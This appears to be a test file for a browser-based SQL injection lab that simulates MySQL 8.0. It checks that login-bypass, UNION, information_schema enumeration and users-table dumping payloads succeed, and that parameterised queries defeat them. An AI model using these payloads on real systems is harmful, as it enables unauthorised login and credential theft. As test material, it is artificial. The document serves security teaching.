// The SQL injection lab's database model (static/js/labs/sqli.js): classic payloads behave as they do on MySQL 8.0,
// errors use MySQL's own codes and wording, and parameterised queries make the same input harmless.
import test from "node:test";
import assert from "node:assert/strict";
import { sha256, run, request, judge, shopDb, tokenize } from "../static/js/labs/sqli.js";

test("sha256 matches the published test vectors", () => {
  assert.equal(sha256(""), "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
  assert.equal(sha256("abc"), "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
  assert.equal(sha256("a".repeat(1000)), "41edece42d63e8d9bf515a9ba6932e1c20cbc9f5a5d134645adb5db1b9737ea3");
});
test("the test account signs in normally", () => {
  const r = request("login", { username: "j.okafor", password: "Biscuit-Tin-42" });
  assert.deepEqual(JSON.parse(JSON.stringify(r.result.values)), [[2, "j.okafor", "customer"]]);
  assert.equal(request("login", { username: "j.okafor", password: "wrong" }).result.values.length, 0);
});
test("a lone quote breaks the query with MySQL's 1064 syntax error", () => {
  const r = request("login", { username: "'", password: "x" });
  assert.equal(r.error.code, 1064); assert.equal(r.error.state, "42000");
  assert.match(r.error.message, /^You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '.*' at line 1$/);
});
test("comment-out and always-true payloads sign in as admin", () => {
  for (const u of ["admin' -- ", "admin'#", "' OR '1'='1' -- ", "' OR 1=1#", "admin'/*"]) {
    const r = request("login", { username: u, password: u.endsWith("/*") ? "*/ OR '1'='1' -- " : "anything" });
    assert.ok(!r.error, `${u}: ${r.error?.message}`); assert.equal(r.result.values[0][2], "admin", u);
  }
  assert.equal(request("login", { username: "admin'--", password: "x" }).error?.code, 1064, "MySQL needs a space after --");
});
test("UNION needs the same number of columns, and ORDER BY finds that number", () => {
  assert.equal(request("search", { q: "' UNION SELECT 1, 2 -- " }).error.code, 1222);
  assert.equal(request("search", { q: "' UNION SELECT 1, 2 -- " }).error.message, "The used SELECT statements have a different number of columns");
  assert.ok(!request("search", { q: "' ORDER BY 3 -- " }).error);
  assert.equal(request("search", { q: "' ORDER BY 4 -- " }).error.message, "Unknown column '4' in 'order clause'");
  assert.ok(request("search", { q: "' UNION SELECT 1, 2, 3 -- " }).result.values.some(r => r[0] === 1));
});
test("the users table can be found and read through the search box", () => {
  const t = request("search", { q: "zzz' UNION SELECT table_name, table_schema, NULL FROM information_schema.tables -- " });
  assert.ok(t.result.values.some(r => r[0] === "users"));
  const c = request("search", { q: "zzz' UNION SELECT column_name, table_name, NULL FROM information_schema.columns WHERE table_name = 'users' -- " });
  assert.ok(c.result.values.some(r => r[0] === "password_hash"));
  const d = request("search", { q: "zzz' UNION SELECT username, password_hash, role FROM users -- " });
  const admin = shopDb().tables.users[0];
  assert.ok(d.result.values.some(r => r[0] === "admin" && r[1] === admin.password_hash));
  assert.equal(request("search", { q: "' UNION SELECT version(), database(), user() -- " }).result.values.at(-1).join("|"), "8.0.36|wrenfield_shop|shop_app@localhost");
});
test("MySQL's other errors: unknown table and unknown column", () => {
  assert.equal(request("search", { q: "' UNION SELECT 1,2,3 FROM secrets -- " }).error.message, "Table 'wrenfield_shop.secrets' doesn't exist");
  assert.equal(request("search", { q: "' UNION SELECT pin,2,3 FROM users -- " }).error.message, "Unknown column 'pin' in 'field list'");
  assert.throws(() => run("SELECT name FROM products WHERE colour = 'red'"), /Unknown column 'colour' in 'where clause'/);
});
test("parameterised queries treat every payload as plain data", () => {
  for (const u of ["admin' -- ", "' OR '1'='1' -- ", "'", "\\' OR 1=1#"]) {
    const r = request("login", { username: u, password: "x" }, { safe: true });
    assert.ok(!r.error); assert.equal(r.result.values.length, 0, u); assert.match(r.sql, /username = \?/);
  }
  assert.equal(request("search", { q: "' UNION SELECT username, password_hash, role FROM users -- " }, { safe: true }).result.values.length, 0);
  assert.equal(request("search", { q: "mug" }, { safe: true }).result.values.length, 1);
  assert.equal(request("login", { username: "j.okafor", password: "Biscuit-Tin-42" }, { safe: true }).result.values.length, 1);
});
test("each objective is reached by the move it describes, and not by the others", () => {
  const h = (kind, input, safe = false) => ({ kind, input, safe, ...request(kind, input, { safe }) });
  const steps = [h("login", { username: "j.okafor", password: "Biscuit-Tin-42" }), h("login", { username: "'", password: "x" }),
    h("login", { username: "admin' -- ", password: "x" }), h("search", { q: "' UNION SELECT 1, 2, 3 -- " }),
    h("search", { q: "' UNION SELECT username, password_hash, role FROM users -- " }), h("login", { username: "admin' -- ", password: "x" }, true)];
  const ids = ["sign-in", "break", "bypass", "union", "dump", "fix"];
  // reading the users table is itself a working UNION, so step 4 also counts for "union"
  steps.forEach((s, k) => { const got = judge([s]); ids.forEach((id, j) => assert.equal(got[id], j === k || (k === 4 && id === "union"), `${id} after step ${k}`)); });
});
test("comments and quotes tokenise like MySQL", () => {
  assert.deepEqual(tokenize("SELECT 'it''s' -- tail").map(t => t.v), ["SELECT", "it's"]);
  assert.deepEqual(tokenize("SELECT 1 # tail").map(t => t.v), ["SELECT", 1]);
});
